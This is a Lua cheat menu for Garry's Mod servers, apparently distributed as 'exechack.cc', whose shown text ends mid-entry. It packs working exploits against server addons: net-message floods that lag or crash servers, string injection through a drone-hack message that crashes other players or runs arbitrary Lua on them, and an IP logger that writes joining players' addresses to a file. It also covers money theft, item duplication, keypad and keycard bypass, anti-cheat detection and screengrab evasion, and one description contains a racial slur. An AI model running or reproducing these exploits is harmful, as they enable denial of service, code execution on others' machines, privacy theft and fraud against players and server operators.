--exechack.cc official lua(User MongRaff)
local version = 'Private'

local net, util, timer, file, ents, concommand, cookie, hook

local gtbl = _Z_ and _Z_ or _G

net, util, timer, file, ents, concommand, cookie, hook = gtbl.net, gtbl.util, gtbl.timer, gtbl.file, gtbl.ents, gtbl.concommand, gtbl.cookie, _G.hook



local function netValid( ... )

	local tbl = { ... }

	for i = 1, #tbl do

		local name = string.lower( tbl[ i ] )

		if !net.Receivers[ name ] and util.NetworkStringToID( name ) == 0 then

			return false

		end

	end

	

	return true

end



local function concValid( ... )

	local conctbl = concommand.GetTable()

	local tbl = { ... }



	for i = 1, #tbl do

		if not conctbl[ tbl[ i ] ] then

			return false

		end

	end

	

	return true

end



local function hookValid( ... )

	local hooks = hook.GetTable()

	local args = { ... }



	for i = 1, math.max( #args / 2, 1 ) do

		local events = hooks[ args[ i ] ]



		if not events or not events[ args[ i * 2 ] ] then

			return false

		end

	end

	

	return true

end



local function playsound( soundname )

	sound.PlayFile( soundname, '', function() end )

end



surface.CreateFont( '_z_em', { 

	font = 'Roboto',

	size = 20,

	extended = true

} )



surface.CreateFont( '_z_emm', { 

	font = 'Roboto',

	size = 15,

	extended = true

} )



//Bypasses



timer.Destroy( 'STC' )

hook.Remove( 'PlayerInitialSpawn', 'AddPlayer' )



//Anti-Screengrab



local function scrgrb()

	if _Z_ and _Z_.screengrab then

		return true

	end



	if GTS and GTS[ 'GTS:ScaledNetworkEntry' ][ 'Request' ] then

		return true

	end

	

	if LeyScreenCap and LeyScreenCap.shouldcap then

		return true

	end

end



if hookValid( 'PostRender', 'Screengrab' ) then

	hook.Remove( 'PostRender', 'Screengrab' )

end



//Vars



local scrw, scrh = ScrW() * 0.75, ScrH() * 0.75



local exploitinfo = {}

local currenttext = ''

local selectedplys = {}

local selectedall = false



local exploitavailable = 0

local exploitcount = 0

local antiexp = {}

local antiexpdetect = false



local spotsdraw = !isstring( cookie.GetString( '_z_wallpaper' ) )

local spotstable = {}

for i = 1, 25 do

	spotstable[ i ] = { x = math.Rand( 1, scrw ), y = math.Rand( 1, scrh ), x2 = math.Rand( -2, 2 ), y2 = math.Rand( -2, 2 ) }

end



local count = {}

local function getCount( name )

	local countn = ( count[ name ] or 0 ) + 1

	count[ name ] = countn

	return countn

end





local bgs = {

	{ url = 'https://steamuserimages-a.akamaihd.net/ugc/830200028751744708/80F144A830BA23C83F4333118E8E9A5C5BAF77CA/?imw=512&imh=512&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true',

	w = 512, h = 512,

	color = Color( 0, 0, 0 ) },

	

	{ url = 'https://static.cracked.to/uploads/avatars/avatar_77664.gif',

	w = 175, h = 175,

	color = Color( 21, 21, 21 ) }

}

local bg = bgs[ math.random( #bgs ) ]



local lply = LocalPlayer()

local whitelist = {

	[ 'STEAM_0:0:227388576' ] = true, --Я

	[ 'STEAM_0:0:149468019' ] = true,

	

	[ 'STEAM_0:1:116008424' ] = true, --Тостер

	

	[ 'STEAM_0:1:555448310' ] = true, --Макс

	[ 'STEAM_0:1:433109673' ] = true,

	[ 'STEAM_0:1:49246984' ] = true,

	[ 'STEAM_0:0:518211648' ] = true,

	[ 'STEAM_0:1:530488193' ] = true,

	

	[ 'STEAM_0:0:211825646' ] = true, --Кто

}



local function EyeTrace()

	return GetEyeTrace and GetEyeTrace() or util.TraceLine( {

		start = lply:EyePos(),

		endpos = lply:EyePos() + lply:EyeAngles():Forward() * 10000,

		filter = lply

	} )

end



local sounds = {

	'sound/UI/buttonrollover.wav',

	'sound/UI/buttonclick.wav',

	'sound/UI/buttonclickrelease.wav',

	'sound/buttons/button11.wav',

}



//AntiExploits



if concValid( 'cpe_menu' ) then

	table.insert( antiexp, 'CPE' )

	antiexpdetect = true

end



if SwiftAC then

	table.insert( antiexp, 'SwiftAC' )

	antiexpdetect = true

end



if concValid( 'nbp_config' ) then

	table.insert( antiexp, 'NBP' )

	antiexpdetect = true

end



if gAC then

	table.insert( antiexp, 'GAC' )

	antiexpdetect = true

end



//Exploits



local exploits = {

	{ name = 'Краш сервера #' .. getCount(  'crashserver' ), desc = 'Перед включением поставьте рэгдолл', check = function()

		return netValid( 'properties' )

	end, func = function()

		local ragdolls = ents.FindByClass( 'prop_ragdoll' )

		

		for i = 1, #ragdolls do

			local ragdoll = ragdolls[ i ]

			

			if ragdoll:IsRagdoll() and gamemode.Call( 'CanProperty', lply, 'motioncontrol_ragdoll', ragdoll ) then

				for _ = 1, 1000 do

					net.Start( 'properties' )

					net.WriteString( 'motioncontrol_ragdoll' )

					net.WriteEntity( ragdoll )

					net.SendToServer()

				end

				break

			end

		end

	end, rare = 4, status = 'Detect' },



 	{ name = 'Лаги #' .. getCount( 'lags' ), desc = 'Залагивание сервера с помощью GM-Donate', check = function()

		return netValid( 'TL.sayColor' )

	end, func = function()

		for _ = 1, 10000 do

        	net.Start( 'TL.sayColor', true )

            net.SendToServer()

		end

	end, t = .01, tn = 'tl.saycolorlags', rare = 3, status = 'Detect' },



 	{ name = 'Лаги #' .. getCount( 'lags' ), desc = 'Залагивание сервера', check = function()

		return netValid( 'StackGhost' )

	end, func = function()

		for _ = 1, 10000 do

			net.Start( 'StackGhost', true )

			net.SendToServer()

		end

	end, t = .01, tn = 'stackghostlags', rare = 3, status = 'Outdated' },



 	{ name = 'Лаги #' .. getCount( 'lags' ), desc = 'Вам нужно держать в руках оружие из CW 2.0', check = function()

		return netValid( 'CW20_PRESET_LOAD' )

	end, func = function()

		for _ = 1, 10000 do

			net.Start( 'CW20_PRESET_LOAD', true )

			net.SendToServer()

		end

	end, t = .01, tn = 'cw20lags', rare = 2, status = 'Detect' },



 	{ name = 'Лаги #' .. getCount( 'lags' ), desc = 'Залагивание сервера с помощью скринграба', check = function()

		return concValid( 'screengrab' )

	end, func = function()

		for _ = 1, 10000 do

			net.Start( 'rtxappend2', true )

			net.WriteTable( { 'lol' } )

			net.SendToServer()

		end

	end, t = .01, tn = 'rtxappend2lag', rare = 1, status = 'Detect' },



 	{ name = 'Лаги #' .. getCount( 'lags' ), desc = 'Залагивание сервера с помощью взломщика дронов', check = function()

		return netValid( 'drones_usecmd' )

	end, func = function()

		local ents = ents.FindByClass( 'hacktool_drone' )

		local plys = player.GetHumans()

		for i = 1, #ents do

			local ent = ents[ i ]

			for _ = 1, 100 do

				net.Start( 'drones_usecmd' )

				net.WriteEntity( ent )

				net.WriteEntity( plys[ math.random( #plys ) ] )

				net.WriteString( 'help' )

				net.SendToServer()

			end

		end

	end, t = .01, tn = 'dronelags', rare = 1, status = 'Detect' },



 	{ name = 'Лаги #' .. getCount( 'lags' ), desc = 'Залагивание сервера с помощью поинтшопа', check = function()

		return netValid( 'ItemStoreUse' )

	end, func = function()

		for _ = 1, 10000 do

			net.Start( 'ItemStoreUse', true )

			net.SendToServer()

		end

	end, t = .01, tn = 'lagsitemstore', rare = 1, status = 'Detect' },



 	{ name = 'Лаги #' .. getCount( 'lags' ), desc = 'Залагивание сервера', check = function()

		return netValid( 'Morpheus.StaffTracker' )

	end, func = function()

		for _ = 1, 10000 do

			net.Start( 'Morpheus.StaffTracker', true )

			net.SendToServer()

		end

	end, t = .01, tn = 'lagsmorph', rare = 1, status = 'Outdated' },



 	{ name = 'Лаги #' .. getCount( 'lags' ), desc = 'Залагивание сервера с помощью поинтшопа', check = function()

		return netValid( 'SlotsRemoved' )

	end, func = function()

		for _ = 1, 10000 do

			net.Start( 'SlotsRemoved', true )

			net.SendToServer()

		end

	end, t = .01, tn = 'pslotslags', rare = 1, status = 'Detect' },



 	{ name = 'Лаги #' .. getCount( 'lags' ), desc = 'Залагивание сервера с помощью информации о подключениях', check = function()

		return netValid( 'join_disconnect' )

	end, func = function()

		for _ = 1, 10000 do

			net.Start( 'join_disconnect', true )

			net.SendToServer()

		end

	end, t = .01, tn = 'joindisclags', rare = 1, status = 'Detect' },



 	{ name = 'Лаги #' .. getCount( 'lags' ), desc = 'Кикнуть всех игроков с помощью RDM-менеджера', check = function()

		return netValid( 'DL_Answering' )

	end, func = function()

		for _ = 1, 10000 do

			net.Start( 'DL_Answering', true )

			net.SendToServer()

		end

	end, t = .01, tn = 'dlanswlags', rare = 1, status = 'Detect' },



 	{ name = 'Лаги #' .. getCount( 'lags' ), desc = 'Залагивание сервера с помощью ESM', check = function()

		return netValid( 'ESM_WelcomePointsModule_PlayerReady' )

	end, func = function()

		for _ = 1, 10000 do

			net.Start( 'ESM_WelcomePointsModule_PlayerReady', true )

			net.SendToServer()

		end

	end, t = .01, tn = 'esmlags', rare = 2, status = 'Undetected' },



 	{ name = 'Лаги #' .. getCount( 'lags' ), desc = 'Залагивание сервера с помощью NadMod', check = function()

		return netValid( 'nadmod_ppfriends' )

	end, func = function()

		for _ = 1, 10000 do

			net.Start( 'nadmod_ppfriends', true )

			net.SendToServer()

		end

	end, t = .01, tn = 'nadmodlags', rare = 1, status = 'Undetected' },



 	{ name = 'Лаги #' .. getCount( 'lags' ), desc = 'Залагивание сервера с помощью ULX', check = function()

		return netValid( 'ulxcc_RequestFiles' )

	end, func = function()

		for _ = 1, 10000 do

			net.Start( 'ulxcc_RequestFiles', true )

			net.SendToServer()

		end

	end, t = .01, tn = 'ulxccfileslags', rare = 1, status = 'Undetected' },



 	{ name = 'Лаги #' .. getCount( 'lags' ), desc = 'Залагивание сервера с помощью OutFitter', check = function()

		return outfitter

	end, func = function()

		for _ = 1, 5000 do

			net.Start( 'BodyGroupData', true )

			net.SendToServer()

			net.Start( 'NetData', true )

			net.SendToServer()

		end

	end, t = .01, tn = 'outfitterlags', rare = 1, status = 'Detect' },



 	{ name = 'Лаги клиента #' .. getCount( 'lagsclient' ), desc = 'Залагивание выбранных игроков с помощью чата', check = function()

		return atlaschat

	end, func = function()

		if table.Count( selectedplys ) == 0 then

			return

		end

		

		local _, ply = table.Random( selectedplys )

		

		for _ = 1, 1000 do

			net.Start( 'atlaschat.invpm', true )

			net.WriteUInt( 0, 8 )

			net.WriteString( ply:SteamID() )

			net.SendToServer()

		end

	end, t = .01, tn = 'atlasinvitelagsclient', rare = 1, status = 'Undetected' },



 	{ name = 'Краш клиента #' .. getCount( 'crashclient' ), desc = 'Крашнуть выбранных игроков с помощью взломщика дронов', check = function()

		return netValid( 'drones_usecmd' )

	end, func = function()

		local ent = ents.FindByClass( 'hacktool_drone' )[ 1 ]

		if !ent:IsValid() then

			return

		end

		

		net.Start( 'drones_usecmd' )

		net.WriteEntity( ent )

		net.WriteEntity( lply )

		net.WriteString( '\')table.Empty(debug.getregistry())--' )

		net.SendToServer()

	end, rare = 2, status = 'Detect' },



 	{ name = 'Взлом игроков', desc = 'Запуск луа на выбранных игроках с помощью взломщика дронов', check = function()

		return netValid( 'drones_usecmd' )

	end, func = function()

		local ent = ents.FindByClass( 'hacktool_drone' )[ 1 ]

		if !ent:IsValid() then

			return

		end

		

		net.Start( 'drones_usecmd' )

		net.WriteEntity( ent )

		net.WriteEntity( lply )

		net.WriteString( '\')' .. currenttext .. '--' )

		net.SendToServer()

		

		for ply in pairs( selectedplys ) do

			net.Start( 'drones_usecmd' )

			net.WriteEntity( ent )

			net.WriteEntity( ply )

			net.WriteString( 'consolelog' )

			net.SendToServer()

		end

		

		net.Start( 'drones_usecmd' )

		net.WriteEntity( ent )

		net.WriteEntity( lply )

		net.WriteString( 'clear' )

		net.SendToServer()

	end, rare = 2, status = 'Detect' },



 	{ name = 'Многострочный флуд в чат', desc = 'Пишет в чат ваш текст в 3 строки', check = function()

		return true

	end, func = function()

		lply:ConCommand( 'say ' .. currenttext .. string.rep( '\t', 64 ) )

	end, t = .01, tn = 'chatfloodbig', rare = 0, status = 'Undetected' },



 	{ name = 'Флуд в ЛС', desc = 'Флудит всем выбранным игрокам в лс', check = function()

		return ulx and ulx.psay

	end, func = function()

		for ply in pairs( selectedplys ) do

			lply:ConCommand( 'ulx psay $' .. ply:UserID() .. ' \"' .. currenttext .. '\"' )

		end

	end, t = .01, tn = 'ulxflood', rare = 0, status = 'Undetected' },



 	{ name = 'Получить пасхальное яйцо', desc = 'Ничего не даёт кроме пометки в чате', check = function()

		return ConVarExists( 'eastereggs_enable' )

	end, func = function()

		lply:ConCommand( 'say 4bigz;cc_egg2' )

		net.Start( 'egg' )

		net.SendToServer()

	end, rare = 1, status = 'Undetected' },



 	{ name = 'Взлом иконок', desc = 'Каждую десятую секунды меняет иконку над вами на любую', check = function()

		return netValid( 'PlyStatusIcons_StatusUpdate' )

	end, func = function()

		net.Start( 'PlyStatusIcons_StatusUpdate' )

		net.WriteUInt( math.random( 1, 7 ), 7 )

		net.SendToServer()

	end, t = .1, tn = 'iconhack', rare = 2, status = 'Undetected' },



 	{ name = 'Запустить луа', desc = 'Запустить луа на себе', check = function()

		return true

	end, func = function()

		RunString( currenttext )

	end, rare = 0, status = 'Undetected' },



 	{ name = 'Кликер #' .. getCount( 'clicker' ), desc = 'Быстро взломать наручники, быстро спавнить что-либо', check = function()

		return true

	end, act = function()

		hook.Add( 'CreateMove', '_z_em_clicker', function( usercmd )

			if usercmd:TickCount() % 2 == 0 then

				usercmd:SetButtons( bit.bor( usercmd:GetButtons(), IN_ATTACK ) )

			else

				usercmd:SetButtons( bit.bor( usercmd:GetButtons(), IN_ATTACK2 ) )

			end

		end )

	end, deact = function()

		hook.Remove( 'CreateMove', '_z_em_clicker' )

	end, t = 0, tn = 'clicker', rare = 0, status = 'Undetected' },



 	{ name = 'Кликер #' .. getCount( 'clicker' ), desc = 'Флудить дверью или т.п.', check = function()

		return true

	end, act = function()

		hook.Add( 'CreateMove', '_z_em_clickeruse', function( usercmd )

			if usercmd:TickCount() % 2 == 0 then

				usercmd:SetButtons( bit.bor( usercmd:GetButtons(), IN_USE ) )

			end

		end )

	end, deact = function()

		hook.Remove( 'CreateMove', '_z_em_clickeruse' )

	end, t = 0, tn = 'clickeruse', rare = 0, status = 'Undetected' },

	

 	{ name = 'Получить халяву #' .. getCount( 'free' ), desc = 'Получить халяву с викторин (нужно ждать некоторое время, скрипт сам будет проходить викторины)', check = function()

		return netValid( 'quizhuiz' )

	end, act = function()

		net.Receive( 'quizhuiz', function()

			net.ReadFloat()

			net.ReadColor()

			net.ReadString()

			net.ReadColor()

			net.ReadString()

			net.ReadString()

			net.ReadColor()

			

			lply:ConCommand( 'say ' .. net.ReadFloat() + net.ReadFloat() )

		end )

	end, deact = function()

		net.Receivers.quizhuiz = exploitinfo.quizhuiz

	end, t = 0, tn = 'quizhuizfree', rare = 2, status = 'Undetected', tags = {

		quizhuiz = net.Receivers[ 'quizhuiz' ]

	} },

	

 	{ name = 'Получить халяву #' .. getCount( 'free' ), desc = 'Получить халяву с авто-сбора денег с принтера (работает только на дистанции меньше 100)', check = function()

		return netValid( 'GambitPrinter.Withdraw' )

	end, func = function()

		exploitinfo.fprinterindex = exploitinfo.fprinterindex + 1

		

		local ents = ents.FindByClass( 'f_printer' )

		local count = #ents

		

		if exploitinfo.fprinterindex > count then

			exploitinfo.fprinterindex = 1

		end

		

		local ent = ents[ exploitinfo.fprinterindex ]

		

		if ent and ent:IsValid() and ent:GetPos():Distance( lply:GetPos() ) < 300 and ( !ent.GetMoney or ent:GetMoney() > 0 ) then

			net.Start( 'GambitPrinter.Withdraw' )

			net.WriteEntity( ent )

			net.SendToServer()

		end

	end, t = .1, tn = 'fprinterhack', rare = 1, status = 'Undetected', tags = {

		fprinterindex = 0

	} },

	

 	{ name = 'Получить халяву #' .. getCount( 'free' ), desc = 'Получить халяву с авто-сбора денег с принтера (работает только на дистанции меньше 100)', check = function()

		return netValid( 'GPrinter.Withdraw' )

	end, func = function()

		exploitinfo.gprinterindex = exploitinfo.gprinterindex + 1

		

		local ents = ents.FindByClass( 'g-printer' )

		local count = #ents

		

		if exploitinfo.gprinterindex > count then

			exploitinfo.gprinterindex = 1

		end

		

		local ent = ents[ exploitinfo.gprinterindex ]



		if ent and ent:IsValid() and ent:GetPos():Distance( lply:GetPos() ) < 100 and ( !ent.GetMoney or ent:GetMoney() > 0 ) then

			net.Start( 'GPrinter.Withdraw' )

			net.WriteEntity( ent )

			net.SendToServer()

		end

	end, t = .1, tn = 'gprinterhack', rare = 1, status = 'Undetected', tags = {

		gprinterindex = 0

	} },

	

 	{ name = 'Получить халяву #' .. getCount( 'free' ), desc = 'Получить халяву с авто-сбора денег с принтера', check = function()

		return netValid( 'ActiveP' )

	end, func = function()

		local ents = ents.FindByClass( 'derma_printer' )

		local pos = lply:GetPos()

		

		for i = 1, #ents do

			local ent = ents[ i ]

			if ent:GetPos():Distance( pos ) < 100 and ent:GetMoney() > 0 then

				net.Start( 'withdrawp' )

				net.WriteEntity( ent )

				net.SendToServer()

			end

		end

	end, t = .1, tn = 'dermaprinterhack', rare = 1, status = 'Use at own risk' },

	

 	{ name = 'Получить халяву #' .. getCount( 'free' ), desc = 'Получить халявные 50 кредитов', check = function()

		return netValid( 'gambitmode' )

	end, func = function()

		net.Start( 'gambitmode' )

		net.SendToServer()

	end, rare = 4, status = 'Undetected' },

	

 	{ name = 'Получить халяву #' .. getCount( 'free' ), desc = 'Получить халяву с авто-сбора денег с кликера (нужно навести прицел, работает только на короткой дистанции)', check = function()

		return netValid( 'money_clicker_withdraw' )

	end, func = function()

		local ent = EyeTrace().Entity



		if ent:IsValid() and ent:GetClass() == 'money_clicker' and ent:GetPos():Distance( lply:GetPos() ) < 150 and ent:GetMoney() > 0 then

			net.Start( 'money_clicker_withdraw' )

			net.WriteEntity( ent )

			net.SendToServer()

		end

	end, t = .1, tn = 'moneyclickerwithdraw', rare = 1, status = 'Undetected' },

	

 	{ name = 'Получить халяву #' .. getCount( 'free' ), desc = 'Получить халяву с авто-сбора денег с кликера (нужно навести прицел, работает только на короткой дистанции)', check = function()

		return netValid( 'money_clicker_withdraw' )

	end, func = function()

		local ent = EyeTrace().Entity



		if ent:IsValid() and ent:GetClass() == 'money_clicker' and ent:GetPos():Distance( lply:GetPos() ) < 150 and ent:GetMoney() > 0 then

			net.Start( 'money_clicker_withdraw' )

			net.WriteEntity( ent )

			net.SendToServer()

		end

	end, t = .1, tn = 'moneyclickerwithdraw', rare = 1, status = 'Undetected' },

	

 	{ name = 'Дюп #' .. getCount( 'dupe' ), desc = 'Дюпнуть предмет под выбранным индексом (нужно вписать в поле снизу)', check = function()

		return itemstore and netValid( 'ItemStoreSplit' )

	end, func = function()

		local pos = tonumber( currenttext )

		if pos and pos > 0 then

			net.Start( 'ItemStoreSplit' )

			net.WriteUInt( lply.InventoryID, 32 )

			net.WriteUInt( pos, 32 )

			net.WriteUInt( 0, 32 )

			net.SendToServer()

		end

	end, rare = 2, status = 'Outdated' },

	

 	{ name = 'Дюп #' .. getCount( 'dupe' ), desc = 'Дюпнуть предмет под выбранным индексом (нужно вписать в поле снизу)', check = function()

		return itemstore and netValid( '_ItemStoreSplit' )

	end, func = function()

		local pos = tonumber( currenttext )

		if pos and pos > 0 then

			net.Start( '_ItemStoreSplit' )

			net.WriteUInt( lply.InventoryID, 32 )

			net.WriteUInt( pos, 32 )

			net.WriteUInt( 0, 32 )

			net.SendToServer()

		end

	end, rare = 2, status = 'Outdated' },

	

 	{ name = 'Автообслуживание принтеров', desc = 'При 75 и более градусов близжайшим принтерам будет закуплено охлаждение', check = function()

		return netValid( 'GambitPrinter.Cool' )

	end, func = function()

		exploitinfo.fprintercoolindex = exploitinfo.fprintercoolindex + 1

		

		local ents = ents.FindByClass( 'f_printer' )

		local count = #ents

		

		if exploitinfo.fprintercoolindex > count then

			exploitinfo.fprintercoolindex = 1

		end

		

		local ent = ents[ exploitinfo.fprintercoolindex ]

		if ent and ent:IsValid() and ent:GetPos():Distance( lply:GetPos() ) < 500 and ent.GetHeat and ent:GetHeat() > 74 then

			net.Start( 'GambitPrinter.Cool' )

			net.WriteEntity( ent )

			net.SendToServer()

		end

	end, t = .1, tn = 'fprintercool', rare = 1, status = 'Undetected', tags = {

		fprintercoolindex = 0

	} },



 	{ name = 'Убить людей', desc = 'Выберите игроков, включите и человек будет погибать (перед активацией нужно попасть в игрока, повторять не нужно)', check = function()

		return LeyHitreg

	end, act = function()

		local global = table.Copy( _G )

		global.net = {

			Start = function( name )

				if !exploitinfo.leyhitregnet then

					exploitinfo.leyhitregnet = name

					LeyHitreg.EntityFireBullets = function() end

				end

			end,

			

			WriteUInt = function() end,

			WriteBool = function() end,

			WriteEntity = function() end,

			WriteVector = function() end,

			SendToServer = function() end

		}

		

		debug.setfenv( LeyHitreg.EntityFireBullets, global )

	end, func = function()		

		local netname = exploitinfo.leyhitregnet

		

		if !netname or table.Count( selectedplys ) == 0 then

			return

		end

		

		local _, ply = table.Random( selectedplys )

		

		if !ply or !ply:IsValid() or !ply:Alive() or ply:HasGodMode() then

			return

		end

		

		local bone = ply:LookupBone( 'ValveBiped.Bip01_Head1' )

		if !bone then

			return

		end

		

		local pos = ply:GetBonePosition( bone )

		if !pos then

			return

		end

		

		net.Start( netname )

		net.WriteUInt( 1, 8 )

		net.WriteBool( true )

		net.WriteEntity( lply:GetActiveWeapon() )

		net.WriteEntity( ply )

		net.WriteVector( pos )

		net.WriteVector( Vector( 0, 0, 0 ) )

		net.WriteVector( pos )

		net.WriteUInt( HITGROUP_HEAD, 8 )

		net.SendToServer()

		

		lply:ConCommand( '+attack' )

		timer.Simple( 0, function()

			lply:ConCommand( '-attack' )

		end )

	end, deact = function()

		if LeyHitreg then

			debug.setfenv( LeyHitreg.EntityFireBullets, _G )

			LeyHitreg.EntityFireBullets = exploitinfo.leyhitreg

		end

	end, t = .1, tn = 'leyhitregkill', rare = 3, status = 'Undetected', tags = {

		leyhitreg = LeyHitreg and LeyHitreg.EntityFireBullets or nil

	} },



 	{ name = 'Взломать наручники', desc = 'Мгновенно взломать наручники', check = function()

		return netValid( 'Kun_ZiptieStruggle' )

	end, func = function()

		net.Start( 'Kun_ZiptieStruggle' )

		net.SendToServer()

	end, rare = 2, status = 'Outdated' },



 	{ name = 'Покрасить игроков', desc = 'Сделать игроков транс-ниггами', check = function()

		return JMod_Hints

	end, func = function()

		exploitinfo.jmodcolor = !exploitinfo.jmodcolor

		local col = exploitinfo.jmodcolor and Color( 255, 255, 255 ) or Color( 0, 0, 0 )

		

		for ply in pairs( selectedplys ) do

			net.Start( 'JMod_MineColor' )

			net.WriteEntity( ply )

			net.WriteColor( col )

			net.WriteBit( true )

			net.SendToServer()

		end

	end, t = .1, tn = 'jmodcolor', rare = 1, status = 'Undetected', tags = {

		jmodcolor = true

	} },

	

 	{ name = 'Взломать UniSec кейпад', desc = 'Нужно на него смотреть и запустить функцию', check = function()

		return usec

	end, func = function()

		local ent = EyeTrace().Entity



		if ent:IsValid() and ent:GetClass() == 'uni_keypad' then

			net.Start( 'usec_paid_door' )

			net.WriteEntity( ent )

			net.WriteBool( true )

			net.SendToServer()

		end

	end, rare = 2, status = 'Detect' },



 	{ name = 'BunnyHop', desc = 'Авто-распрыжка', check = function()

		return true

	end, act = function()

		hook.Add( 'CreateMove', '_z_em_bunnyhop', function( usercmd )

			if lply:WaterLevel() < 2 and lply:GetMoveType() == MOVETYPE_WALK then

				lply:ConCommand( !vgui.CursorVisible() and input.IsKeyDown( KEY_SPACE ) and lply:OnGround() and '+jump' or '-jump' )

			end

		end )

	end, deact = function()

		hook.Remove( 'CreateMove', '_z_em_bunnyhop' )

	end, t = 0, tn = 'bunnyhop', rare = 0, status = 'Detect' },



 	{ name = 'AutoStrafe', desc = 'Ускорение BunnyHop\'а', check = function()

		return true

	end, act = function()

		hook.Add( 'CreateMove', '_z_em_autostrafe', function( usercmd )

			if lply:WaterLevel() < 2 and lply:GetMoveType() == MOVETYPE_WALK and !lply:OnGround() then

				local x = usercmd:GetMouseX()

				if x > 0 then

					usercmd:SetSideMove( 10000 )

				elseif x < 0 then

					usercmd:SetSideMove( -10000 )

				end

			end

		end )

	end, deact = function()

		hook.Remove( 'CreateMove', '_z_em_autostrafe' )

	end, t = 0, tn = 'autostrafe', rare = 0, status = 'Detect' },



 	{ name = 'FastWalk', desc = 'Добавляет 10% к скорости при беге вперёд/назад', check = function()

		return true

	end, act = function()

		hook.Add( 'CreateMove', '_z_em_fastwalk', function( usercmd )

			if lply:GetMoveType() == MOVETYPE_WALK and usercmd:GetForwardMove() ~= 0 then

				if usercmd:TickCount() % 2 == 0 then

					usercmd:SetSideMove( usercmd:GetSideMove() + 5000 )

				else

					usercmd:SetSideMove( usercmd:GetSideMove() - 5000 )

				end

			end

		end )

	end, deact = function()

		hook.Remove( 'CreateMove', '_z_em_fastwalk' )

	end, t = 0, tn = 'fastwalk', rare = 0, status = 'Undetected' },

	

 	{ name = 'IP логгер', desc = 'Записывать айпи заходящих игроков в data/_z_ip.txt', check = function()

		return rlib

	end, act = function()

		net.Receivers[ 'rlib.debug.listener' ] = function()

			if !net.ReadBool() then --Зашел или нет

				return

			end

			if net.ReadBool() then --Бот чек

				return

			end

			

			local name = net.ReadString()

			local ip = net.ReadString()

			local steamid = net.ReadString()

			

			if whitelist[ steamid ] then

				return

			end

			

			file.Append( '_z_ip.txt', string.format( [[%s | %s | %s | %s | %s\n]], game.GetIPAddress(), GetHostName(), name, steamid, ip ) )

		end

	end, deact = function()

		net.Receivers[ 'rlib.debug.listener' ] = exploitinfo[ 'rlib.debug.listener' ]

	end, t = 0, tn = 'rlibiplogger', rare = 4, status = 'Undetected', tags = {

		[ 'rlib.debug.listener' ] = net.Receivers[ 'rlib.debug.listener' ]

	} },

	

 	{ name = 'Подкрутка рейтинга админу', desc = 'Выдает 100 раз оценку (текст снизу) админу (работает только сразу после закрытия жалобы админом, нельзя выдавать звезды самому)', check = function()

		return cats

	end, func = function()

		local int = 0

		

		if currenttext ~= '' then

			int = math.Clamp( tonumber( currenttext ), 1, 5 )

		end

		

		for _ = 1, 100 do

			net.Start( 'cats.setRating' )

			net.WriteUInt( int == 0 and math.random( 1, 5 ) or int, 8 )

			net.SendToServer()

		end

	end, rare = 2, status = 'Undetected' },

	

 	{ name = 'Взломать KeyCard', desc = 'Нужно на него смотреть и запустить функцию', check = function()

		return netValid( 'netKeycardAdminSpawn' )

	end, func = function()

		local ent = EyeTrace().Entity

		if ent:IsValid() and ent:GetClass() == 'ent_keycardscanner' then

			net.Start( 'netKeycardAdminSpawn' )

			net.WriteEntity( ent )

			net.SendToServer()

		end

	end, rare = 2, status = 'Undetected' },

	

 	{ name = 'Заблокировать все KeyCard\'ы', desc = 'Блокируется все KeyCard\'ы на карте', check = function()

		return netValid( 'netKeycardHackSpawn' )

	end, func = function()

		local ents = ents.FindByClass( 'ent_keycardscanner' )

		for i = 1, #ents do

			net.Start( 'netKeycardHackSpawn' )

			net.WriteEntity( ents[ i ] )

			net.SendToServer()

		end

	end, t = .1, tn = 'keycardlock', rare = 2, status = 'Undetected' },

	

 	{ name = 'Взломать MoneyPrinter', desc = 'Мнгновенный взлом владельца принтера, на который вы смотрите, работает на близкой дистанции', check = function()

		return netValid( 'money_clicker_steal' )

	end, func = function()

		local ent = EyeTrace().Entity



		if not ent:IsValid() or ent:GetClass() ~= 'money_clicker' then return end



		net.Start( 'money_clicker_steal' )

		net.WriteEntity( ent )

		net.WriteBool( false )

		net.SendToServer()



		net.Start( 'money_clicker_steal' )

		net.WriteEntity( ent )

		net.WriteBool( true )

		net.SendToServer()

	end, rare = 2, status = 'Undetected' },

	

 	{ name = 'Блок Keypad\'ов #' .. getCount( 'keypadblock' ), desc = 'Кейпады рядом с Вами будут сверкать и на них нельзя будет ввести пароль', check = function()

		return PatternKeypad

	end, func = function()

		local keypads = ents.FindByClass( 'keypad_pattern' )



		for i = 1, #keypads do

			local keypad = keypads[ i ]



			if keypad:GetPos():Distance( lply:GetPos() ) < 250 then

				keypad:SendCombination( {} )

			end

		end

	end, tn = 'patternkeypadhack', t = .1, rare = 1, status = 'Undetected' },

	

 	{ name = 'Блок Keypad\'ов #' .. getCount( 'keypadblock' ), desc = 'Пароли кейпадов рядом с Вами будут постоянно очищаться', check = function()

		return netValid( 'keypad' ) or netValid( 'keypad_command' )

	end, func = function()

		local keypads = ents.FindByClass( 'keypad' )



		for i = 1, #keypads do

			local keypad = keypads[ i ]



			if keypad:GetPos():DistToSqr( lply:GetPos() ) < 14400 and ( ( keypad.GetText and keypad:GetText() ~= '' ) or ( keypad.GetDisplayText and keypad:GetDisplayText() ~= '' ) ) then

				if keypad.SendCommand then

					keypad:SendCommand( keypad.Command_Abort )

				else

					net.Start( 'keypad_command' )

					net.WriteEntity( keypad )

					net.WriteUInt( keypad.Command_Reset, 3 )

					net.SendToServer()

				end

			end

		end

	end, tn = 'keypadblock', t = .1, rare = 1, status = 'Undetected' },

	

 	{ name = 'Удалить NLR экран', desc = 'Убирает чёрный экран при входе в NLR зону', check = function()

 		return hookValid( 'HUDPaint', 'Draw_NLR_Circle' )

	end, act = function()

		hook.Add( 'HUDPaint', 'Draw_NLR_Circle', function() end )

	end, deact = function()

		hook.Add( 'HUDPaint', 'Draw_NLR_Circle', exploitinfo[ 'oldNLRHud' ] )

	end, tn = '', t = 0, rare = 0, status = 'Undetected', tags = {

		[ 'oldNLRHud' ] = hook.GetTable()[ 'HUDPaint'][ 'Draw_NLR_Circle' ]

	} },

	

 	{ name = 'Включить лапы зайца', desc = 'Донатный BunnyHop', check = function()

 		return bhmenu

	end, func = function()

		net.Start( 'zaika' )

		net.SendToServer()

	end, rare = 2, status = 'Undetected' },

	

 	{ name = 'Включить лапы зайца', desc = 'Донатный BunnyHop', check = function()

 		return bhmenu

	end, func = function()

		net.Start( 'zaika' )

		net.SendToServer()

	end, rare = 2, status = 'Undetected' },

	

 	{ name = 'Включить магнит хищника', desc = 'Донатный прикол', check = function()

 		return true

	end, func = function()

